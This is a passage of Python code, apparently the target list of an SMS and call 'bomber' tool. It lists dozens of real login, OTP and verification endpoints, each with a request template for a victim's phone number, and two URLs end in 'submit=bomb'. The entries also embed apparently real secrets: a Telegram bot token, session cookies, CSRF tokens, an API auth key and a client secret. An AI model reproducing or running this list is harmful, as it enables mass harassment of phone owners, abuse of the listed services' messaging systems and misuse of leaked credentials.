        "name": 'Swiggy Call Verification',
        "type": 'Call',
        "url": 'https://profile.swiggy.com/api/v3/app/request_call_verification',
        "method": 'POST',
        "headers": {'content-type': 'application/json; charset=utf-8', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Railmadad OTP Fetch',
        "type": 'SMS',
        "url": lambda p: f"https://railmadad.indianrailways.gov.in/madad/FetchData?mobile={p}&email=&fetchdatatype=userotp",
        "method": 'GET',
        "headers": {'host': 'railmadad.indianrailways.gov.in', 'connection': 'Keep Alive', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": None,
    },
    {
        "name": 'Lenskart SMS',
        "type": 'SMS',
        "url": 'https://api-gateway.juno.lenskart.com/v3/customers/sendOtp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phoneCode": "+91", "telephone": "{p}"}}',
    },
    {
        "name": 'NoBroker SMS',
        "type": 'SMS',
        "url": 'https://www.nobroker.in/api/v3/account/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"phone": "{p}", "countryCode": "IN"}}',
    },
    {
        "name": 'PharmEasy SMS',
        "type": 'SMS',
        "url": 'https://pharmeasy.in/api/v2/auth/send-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Wakefit SMS',
        "type": 'SMS',
        "url": 'https://api.wakefit.co/api/consumer-sms-otp/',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": "Byju's SMS",
        "type": 'SMS',
        "url": 'https://api.byjus.com/v2/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}"}}',
    },
    {
        "name": 'Hungama OTP',
        "type": 'SMS',
        "url": 'https://communication.api.hungama.com/v1/communication/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobileNo": "{p}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}}',
    },
    {
        "name": 'Meru Cab',
        "type": 'SMS',
        "url": 'https://merucabapp.com/api/otp/generate',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"mobile_number": "{p}"}}',
    },
    {
        "name": 'Doubtnut',
        "type": 'SMS',
        "url": 'https://api.doubtnut.com/v4/student/login',
        "method": 'POST',
        "headers": {'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"phone_number": "{p}", "language": "en"}}',
    },
    {
        "name": 'PenPencil',
        "type": 'SMS',
        "url": 'https://api.penpencil.co/v1/users/resend-otp?smsType=1',
        "method": 'POST',
        "headers": {'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{p}"}}',
    },
    {
        "name": 'Snitch',
        "type": 'SMS',
        "url": 'https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile_number": "+91{p}"}}',
    },
    {
        "name": 'Dayco India',
        "type": 'SMS',
        "url": 'https://ekyc.daycoindia.com/api/nscript_functions.php',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
        "data": lambda p: f'{{"api": "send_otp", "brand": "dayco", "mob": "{p}", "resend_otp": "resend_otp"}}',
    },
    {
        "name": 'BeepKart',
        "type": 'SMS',
        "url": 'https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "city": 362}}',
    },
    {
        "name": 'Lending Plate',
        "type": 'SMS',
        "url": 'https://lendingplate.com/api.php',
        "method": 'POST',
        "headers": {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
        "data": lambda p: f'{{"mobiles": "{p}", "resend": "Resend"}}',
    },
    {
        "name": 'ShipRocket',
        "type": 'SMS',
        "url": 'https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobileNumber": "{p}"}}',
    },
    {
        "name": 'GoKwik',
        "type": 'SMS',
        "url": 'https://gkx.gokwik.co/v3/gkstrict/auth/otp/send',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "country": "in"}}',
    },
    {
        "name": 'NewMe',
        "type": 'SMS',
        "url": 'https://prodapi.newme.asia/web/otp/request',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"mobile_number": "{p}", "resend_otp_request": true}}',
    },
    {
        "name": 'Univest',
        "type": 'SMS',
        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'Smytten',
        "type": 'SMS',
        "url": 'https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "email": "test@example.com"}}',
    },
    {
        "name": 'CaratLane',
        "type": 'SMS',
        "url": 'https://www.caratlane.com/cg/dhevudu',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json'},
        "data": lambda p: f'{{"query": "mutation {{SendOtp(input: {{mobile: \"{p}\",isdCode: \"91\",otpType: \"registerOtp\"}}) {{status {{message code}}}}}}"}}',
    },
    {
        "name": 'BikeFixup',
        "type": 'SMS',
        "url": 'https://api.bikefixup.com/api/v2/send-registration-otp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=UTF-8'},
        "data": lambda p: f'{{"phone": "{p}", "app_signature": "4pFtQJwcz6y"}}',
    },
    {
        "name": 'WellAcademy',
        "type": 'SMS',
        "url": 'https://wellacademy.in/store/api/numberLoginV2',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=UTF-8'},
        "data": lambda p: f'{{"contact_no": "{p}"}}',
    },
    {
        "name": 'Firebase Updater',
        "type": 'SMS',
        "url": 'https://updaterohi-default-rtdb.asia-southeast1.firebasedatabase.app/.json',
        "method": 'GET',
        "headers": {'host': 'updaterohi-default-rtdb.asia-southeast1.firebasedatabase.app', 'connection': 'Keep-Alive', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": None,
    },
    {
        "name": 'Firebase WebSocket',
        "type": 'SMS',
        "url": 'https://s-gke-euw1-nssi3-9.europe-west1.firebasedatabase.app/.ws?ns=homespider-59997-default-rtdb&v=5&ls=tboW3mpnM8YnAd9XZIkFe3NdM5pcHvDo',
        "method": 'GET',
        "headers": {'upgrade': 'websocket', 'connection': 'Upgrade', 'sec-websocket-version': '13', 'sec-websocket-key': 'zO1z7lAQZQba+JY9ImELIQ==', 'user-agent': 'Firebase/5/19.3.1/36/Android', 'x-firebase-gmpid': '1:91203274427:android:df9077817b4258b37a8b9e'},
        "data": None,
    },
    {
        "name": 'Telegram Notification',
        "type": 'SMS',
        "url": 'https://api.telegram.org/bot8028222825:AAHwOOy2BFEiT-jc6Rerq9DRixIS-8H8nyU/sendMessage',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": None,
    },
    {
        "name": 'tinder',
        "type": 'SMS',
        "url": 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"phone_number": "{{cc}}{p}"}}',
    },
    {
        "name": 'youla',
        "type": 'SMS',
        "url": 'https://youla.ru/web-api/auth/request_code',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"phone": "+{{cc}}{p}"}}',
    },
    {
        "name": 'ivi',
        "type": 'SMS',
        "url": 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"phone": "{{cc}}{p}"}}',
    },
    {
        "name": 'delitime',
        "type": 'SMS',
        "url": 'https://api.delitime.ru/api/v2/signup',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"SignupForm[username]": "{{cc}}{p}", "SignupForm[device_type]": "3"}}',
    },
    {
        "name": 'icq',
        "type": 'SMS',
        "url": 'https://www.icq.com/smsreg/requestPhoneValidation.php',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"msisdn": "{{cc}}{p}", "locale": "en", "k": "ic1rtwz1s1Hj1O0r", "r": "45559"}}',
    },
    {
        "name": 'ivitv',
        "type": 'SMS',
        "url": 'https://api.ivi.ru/mobileapi/user/register/phone/v6/',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"phone": "{{cc}}{p}", "device": "Windows+v.43+Chrome+v.7453451", "app_version": "870"}}',
    },
    {
        "name": 'redbus',
        "type": 'SMS',
        "url": lambda p: f"https://m.redbus.in/api/getOtp?number={p}&cc={{cc}}&whatsAppOpted=false",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'newtonschools',
        "type": 'SMS',
        "url": 'https://my.newtonschool.co:443/api/v1/user/otp/?registration=true',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"phone": "+{{cc}}{p}"}}',
    },
    {
        "name": 'qiwi',
        "type": 'SMS',
        "url": 'https://mobile-api.qiwi.com/oauth/authorize',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"response_type": "urn:qiwi:oauth:response-type:confirmation-id", "username": "{{cc}}{p}", "client_id": "android-qw", "client_secret": "zAm4FKq9UnSe7id"}}',
    },
    {
        "name": 'JioMart OTP Initiation',
        "type": 'SMS',
        "url": lambda p: f"https://www.jiomart.com/mst/rest/v1/session/initiate/using_mobileno_n_otp?mobile_no={p}",
        "method": 'GET',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": None,
    },
    {
        "name": '3Via',
        "type": 'SMS',
        "url": 'https://3via.ly/api/client/login',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"msisdn": "{p}", "device_type": "web"}}',
    },
    {
        "name": 'Winmore',
        "type": 'SMS',
        "url": 'https://winmore.ly/api/p10/public/get_started',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "countryCode": "ly", "language": "en", "utm": {{}}}}',
    },
    {
        "name": 'Lingo',
        "type": 'SMS',
        "url": 'https://lingo.ly/api/client/login',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"msisdn": "{p}"}}',
    },
    {
        "name": 'Bekam',
        "type": 'SMS',
        "url": 'https://bekam.ly/api/client/login',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"msisdn": "{p}"}}',
    },
    {
        "name": 'Daraz Nepal',
        "type": 'SMS',
        "url": 'https://member.daraz.com.np/user/api/sendVerificationSms',
        "method": 'POST',
        "headers": {'X-CSRF-TOKEN': '57343b8557abe', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://member.daraz.com.np', 'Referer': 'https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG', 'Cookie': 'client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33'},
        "data": lambda p: f'{{"phone": "{p}", "type": "OTP_REGISTER", "lzdAppVersion": "1.0", "X-CSRF-TOKEN": "57343b8557abe", "ncToken": {{"csessionid": "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc", "sig": "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du", "token": "QPXW:1638536554908:0.22529358478093664"}}}}',
    },
    {
        "name": 'Clamphook',
        "type": 'SMS',
        "url": 'https://backend.clamphook.com//auth/register',
        "method": 'POST',
        "headers": {'Host': 'backend.clamphook.com', 'Origin': 'https://clamphook.com', 'Referer': 'https://clamphook.com/', 'Sec-Fetch-Mode': 'cors', 'content-type': 'application/json'},
        "data": lambda p: f'{{"mobile": "{{cc}}-{p}"}}',
    },
    {
        "name": 'allensolly',
        "type": 'SMS',
        "url": 'https://www.allensolly.com/capillarylogin/validateMobileOrEMail',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"mobileoremail": "{p}", "name": "markluther"}}',
    },
    {
        "name": 'frotels',
        "type": 'SMS',
        "url": 'https://www.frotels.com/appsendsms.php',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"mobno": "{p}"}}',
    },
    {
        "name": 'gapoon',
        "type": 'SMS',
        "url": 'https://www.gapoon.com/userSignup',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"mobile": "{p}", "email": "noreply@gmail.com", "name": "LexLuthor"}}',
    },
    {
        "name": 'porter',
        "type": 'SMS',
        "url": 'https://porter.in/restservice/send_app_link_sms',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"phone": "{p}", "referrer_string": "", "brand": "porter"}}',
    },
    {
        "name": 'cityflo',
        "type": 'SMS',
        "url": 'https://cityflo.com/website-app-download-link-sms/',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"mobile_number": "{p}"}}',
    },
    {
        "name": 'nnnow',
        "type": 'SMS',
        "url": 'https://api.nnnow.com/d/api/appDownloadLink',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"mobileNumber": "{p}"}}',
    },
    {
        "name": 'ajio',
        "type": 'SMS',
        "url": 'https://login.web.ajio.com/api/auth/signupSendOTP',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"firstName": "xxps", "login": "wiqpdl223@wqew.com", "password": "QASpw@1s", "genderType": "Male", "mobileNumber": "{p}", "requestType": "SENDOTP"}}',
    },
    {
        "name": 'happyeasygo',
        "type": 'SMS',
        "url": lambda p: f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{p}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'treebo',
        "type": 'SMS',
        "url": 'https://www.treebo.com/api/v2/auth/login/otp/',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"phone_number": "{p}"}}',
    },
    {
        "name": 'airtel',
        "type": 'SMS',
        "url": lambda p: f"https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={p}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'mylescars',
        "type": 'SMS',
        "url": 'https://www.mylescars.com/usermanagements/chkContact',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"contactNo": "{p}"}}',
    },
    {
        "name": 'grofers',
        "type": 'SMS',
        "url": 'https://grofers.com/v2/accounts/',
        "method": 'POST',
        "headers": {'auth_key': '3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7', 'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"user_phone": "{p}"}}',
    },
    {
        "name": 'cashify',
        "type": 'SMS',
        "url": lambda p: f"https://www.cashify.in/api/cu01/v1/app-link?mn={p}",
        "method": 'GET',
        "headers": {},
        "data": None,
    },
    {
        "name": 'paytm',
        "type": 'SMS',
        "url": 'https://commonfront.paytm.com/v4/api/sendsms',
        "method": 'POST',
        "headers": {'content-type': 'application/json'},
        "data": lambda p: f'{{"phone": "{p}", "guid": "2952fa812660c58dc160ca6c9894221d"}}',
    },
    {
        "name": 'kfc-in',
        "type": 'SMS',
        "url": 'https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin',
        "method": 'POST',
        "headers": {'Referer': 'https://online.kfc.co.in/login', '__RequestVerificationToken': '-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01', 'content-type': 'application/json'},
        "data": lambda p: f'{{"AuthorizedFor": "3", "phoneNumber": "{p}", "Resend": "false"}}',
    },
    {
        "name": 'indialends',
        "type": 'SMS',
        "url": 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
        "method": 'POST',
        "headers": {'Referer': 'https://indialends.com/personal-loan', 'content-type': 'application/x-www-form-urlencoded', 'Cookie': '_ga=GA1.2.1483885314.1559157646; _fbp=fb.1.1559157647161.1989205138; TiPMix=91.9909185226964; gcb_t_track=SEO - Google; gcb_t_keyword=; gcb_t_l_url=https://www.google.com/; gcb_utm_medium=; gcb_utm_campaign=; ASP.NET_SessionId=ioqkek5lbgvldlq4i3cmijcs; web_app_landing_utm_source=; web_app_landing_url=/personal-loan; webapp_landing_referral_url=https://www.google.com/; ARRAffinity=747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417; _gid=GA1.2.969623705.1560660444; _gat=1; current_url=https://indialends.com/personal-loan; cookies_plbt=0'},
        "data": lambda p: f'{{"aeyder03teaeare": "1", "ertysvfj74sje": "{{cc}}", "jfsdfu14hkgertd": "{p}", "lj80gertdfg": "0"}}',
    },
    {
        "name": 'qlean',
        "type": 'SMS',
        "url": 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"phone": "{{cc}}{p}"}}',
    },
    {
        "name": 'mailru',
        "type": 'SMS',
        "url": 'https://cloud.mail.ru//api/v2/notify/applink',
        "method": 'POST',
        "headers": {'content-type': 'application/x-www-form-urlencoded'},
        "data": lambda p: f'{{"phone": "+{{cc}}{p}", "api": "2", "email": "email", "x-email": "x-email"}}',
    },
    {
        "name": 'TPCash Send',
        "type": 'SMS',
        "url": lambda p: f"https://tpcash.site/api/ga-api/net_account/send?h5_ver=1.1.0&t=&net_mid=cpshare&phone=91{p}",
        "method": 'GET',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": None,
    },
    {
        "name": 'Meesho OTP',
        "type": 'SMS',
        "url": 'https://www.meesho.com/api/v1/user/login/request-otp',
        "method": 'POST',
        "headers": {'content-type': 'application/json; charset=utf-8', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": lambda p: f'{{"phone_number": "{p}"}}',
    },
    {
        "name": 'Tastes2Plate Login',
        "type": 'SMS',
        "url": 'https://webapi.tastes2plate.com/app/new-login',
        "method": 'POST',
        "headers": {'content-type': 'application/json; charset=utf-8', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": lambda p: f'{{"device_token": "", "mobile": "{p}", "reffer_by": "", "device_type": "web"}}',
    },
    {
        "name": 'Tradgo Forgot Password OTP',
        "type": 'SMS',
        "url": 'https://tradgo.in/appapi4/Forgot_password_new/getOtp',
        "method": 'POST',
        "headers": {'Content-Type': 'application/json; charset=utf-8', 'Host': 'tradgo.in', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.9.1'},
        "data": lambda p: f'{{"mobile": "{p}"}}',
    },
    {
        "name": 'Liquide Check Number',
        "type": 'SMS',
        "url": lambda p: f"https://api.v2.liquide.life/api/auth/checkNumber/+91{p}?otpLogin=true",
        "method": 'GET',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1'},
        "data": None,
    },
    {
        "name": 'Samsung OTP Init',
        "type": 'SMS',
        "url": 'https://www.samsung.com/in/api/v1/sso/otp/init',
        "method": 'POST',
        "headers": {'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8', 'accept-encoding': 'gzip'},
        "data": lambda p: f'{{"user_id": "{p}"}}',
    },
    {
        "name": 'Limeroad Resend OTP',
        "type": 'SMS',
        "url": 'https://www.limeroad.com/auth/resend_otp',
        "method": 'POST',
        "headers": {'accept': '*/*', 'origin': 'https://www.limeroad.com', 'x-requested-with': 'pure.lite.browser', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://www.limeroad.com/auth/login', 'accept-encoding': 'gzip, deflate, br, zstd', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua': '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'cookie': 'a_n_u_a=1; _ruid=70e45bb5-ef00-4682-829e-84b41556a9e7; lrVr=v2; newCssOpt=v1; nH=1; navHeight=48; deviceWidth=360; deviceHeight=620; duid=984879601f523d60ea69b1dd961834ce; _gcl_au=1.1.875752135.1733885739; _ga=GA1.2.1573315999.1733885739; _fbp=fb.1.1733885741567.18659541388049364; _clck=19hkbpp%7C2%7Cfrm%7C0%7C1806; user_selected_gender=male; gender=M; mobile={no}; locale=hi; truecallerLogin=true; _session_id=2a93b3febf6911d924b2dd053298e1db; testCookie=v2; _gid=GA1.2.1657750549.1736179197; google_client_id=1573315999.1733885739; AWSALBTG=jXgPHl1qo/jLC5Qzmnk65zesLvDSS/pqa8AMcErdw3BJkIFXRaYiGpxFi8KwmV/ebJIpRMGEwt6x/m7Iu6W3wNM3+jYqSHMI9QD/ppkAwe8XAKejkB2ISvHi+i4BONe6Q3DuD45xFa6LfoO/v4bT3Up0T4sXjqmDA+8ITkNn7nXj; AWSALBTGCORS=jXgPHl1qo/jLC5Qzmnk65zesLvDSS/pqa8AMcErdw3BJkIFXRaYiGpxFi8KwmV/ebJIpRMGEwt6x/m7Iu6W3wNM3+jYqSHMI9QD/ppkAwe8XAKejkB2ISvHi+i4BONe6Q3DuD45xFa6LfoO/v4bT3Up0T4sXjqmDA+8ITkNn7nXj', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"user_id": "{p}", "ruid": "70e45bb5-ef00-4682-829e-84b41556a9e7"}}',
    },
    {
        "name": 'PenPencil Resend OTP SMS2',
        "type": 'SMS',
        "url": 'https://api.penpencil.co/v1/users/resend-otp?smsType=2',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{p}"}}',
    },
    {
        "name": 'Aviator Online File 1',
        "type": 'SMS',
        "url": lambda p: f"https://aviator597.online/app/api/file-1.php?mobile={p}&submit=bomb",
        "method": 'GET',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/4.11.0'},
        "data": None,
    },
    {
        "name": 'Apollo247 Get OTP On Call',
        "type": 'Call',
        "url": 'https://apigateway.apollo247.in/auth-service/getOTPOnCall',
        "method": 'POST',
        "headers": {'accept': 'application/json, text/plain, */*', 'x-app-os': 'android', 'x-app-version': '7.14.1', 'x-app-device-version': '13', 'authorization': 'Bearer sample_token', 'x-apollo247-api-key': 'sample_api_key', 'x-app-device-id': '4b6614b5b0746a8d', 'origin': 'https://www.apollo247.com', 'referrer': 'https://www.apollo247.com', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/4.11.0', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"loginType": "PATIENT", "mobileNumber": "+91{p}", "id": "b872dfa3-e62f-4173-a9c9-4ca74b4f3b5d"}}',
    },
    {
        "name": 'Depop Phone Verification',
        "type": 'SMS',
        "url": 'https://api.depop.com/api/v1/users/verification/phone-number/',
        "method": 'PUT',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"country_code": "IN", "phone_number": "{p}"}}',
    },
    {
        "name": 'JustDial WhatsApp Verification',
        "type": 'WhatsApp',
        "url": lambda p: f"https://www.justdial.com/functions/whatsappverification.php?name=Hi%2BJistididi&rsend=0&mob={p}",
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/x-www-form-urlencoded; charset=utf-8'},
        "data": None,
    },
    {
        "name": 'Aviator Online File 2',
        "type": 'SMS',
        "url": lambda p: f"https://aviator597.online/app/api/file-2.php?number={p}&submit=bomb",
        "method": 'GET',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/4.11.0'},
        "data": None,
    },
    {
        "name": 'Nykaa Fashion OTP',
        "type": 'SMS',
        "url": 'https://www.nykaafashion.com/webscripts/api/otp/generate',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"customer_mobile": "{p}"}}',
    },
    {
        "name": 'Brevistay Login',
        "type": 'SMS',
        "url": 'https://www.brevistay.com/cst/app-api/login',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
        "data": lambda p: f'{{"is_otp": 1.0, "mobile": "{p}", "is_password": 0.0}}',
    },
    {
        "name": 'Shopsy Login',
        "type": 'SMS',
        "url": 'https://www.shopsy.in/api/1/action/view',
        "method": 'POST',
        "headers": {'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.9.1', 'content-type': 'application/json; charset=utf-8'},
